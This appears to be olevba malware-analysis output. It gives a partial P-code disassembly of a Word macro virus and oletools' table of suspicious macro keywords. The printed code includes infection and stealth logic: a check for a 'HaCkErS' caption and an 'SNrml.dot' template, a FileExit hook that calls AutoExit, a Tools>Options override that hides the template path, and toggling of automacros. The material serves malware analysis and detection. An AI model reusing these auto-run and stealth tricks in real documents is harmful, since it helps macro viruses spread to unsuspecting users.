' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0007 "HaCkErS"
' 	Ne 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0006 "Docume"
' 	LitDI2 0x0001 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0009 "SNrml.dot"
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ArgsCall ViTJMaster 0x0000 
' 	EndIf 
' Line #214:
' 	EndSub 
' Line #215:
' 	FuncDefn (Sub FileExit())
' Line #216:
' 	ArgsCall AutoExit 0x0000 
' Line #217:
' 	EndSub 
' Line #218:
' 	FuncDefn (Sub ViTToolsOptions())
' Line #219:
' 	LitStr 0x002B "C:\Program Files\Microsoft Office\Templates"
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #220:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #221:
' 	Ld Application 
' 	MemLd Path 
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #222:
' 	EndSub 
' Line #223:
' 	FuncDefn (Function WBT())
' Line #224:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall disableautomacros 0x0001 
' Line #225:
' 	EndFunc 
' Line #226:
' 	FuncDefn (Function WBF())
' Line #227:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall disableautomacros 0x0001 
' Line #228:
' 	EndFunc 
' Line #229:
' Line #230:
' 	FuncDefn (Sub MyAction())
' Line #231:
' 	OnError (Resume Next) 
' Line #232:
' 	StartWithExpr 
' 	Ld ActiveWindow 
' 	With 
' Line #233:
' Line #234:
' 	LitVarSpecial (True)
' 	MemStWith DisplayRulers 
' Line #235:
' 	LitVarSpecial (True)
' 	MemStWith DisplayHorizontalScrollBar 
' Line #236:
' 	LitVarSpecial (True)
' 	MemStWith DisplayVerticalRuler 
' Line #237:
' 	LitVarSpecial (True)
' 	MemStWith DisplayVerticalScrollBar 
' Line #238:
' 	QuoteRem 0x0000 0x0020 ".View.ShowTextBoundaries = False"
' Line #239:
' 	EndWith 
' Line #240:
' 	EndSub 
' Line #241:
' Line #242:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

